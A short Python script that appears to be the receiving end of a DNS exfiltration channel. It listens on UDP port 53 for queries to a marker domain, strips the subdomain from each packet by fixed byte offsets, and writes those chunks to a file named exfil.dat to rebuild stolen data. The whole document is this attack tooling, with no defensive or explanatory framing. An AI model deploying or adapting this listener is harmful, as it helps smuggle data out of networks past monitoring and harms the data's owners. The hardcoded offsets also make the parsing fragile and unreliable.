#! /usr/bin/python

# listen for dns requests for various subdomains
# take subdomain and piece together the file.

import socket
import sys, binascii

domain="iamev";
request="";
subdomain="";
response="127.0.0.1";

outfile=open('exfil.dat', 'w');

UDP_IP="127.0.0.1";
UDP_PORT=53

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
sock.bind((UDP_IP, UDP_PORT));

while True:
        data, addr= sock.recvfrom(4096);
#        print("address", addr);
#        print("received message:", data);

        if domain.encode() in data:
                subdomain=data[13:-24].decode();
                print("exfil: ", subdomain);
                outfile.write(subdomain+"\n");
                
        else:
	        #gethostbyname(request);
                print("get host data");
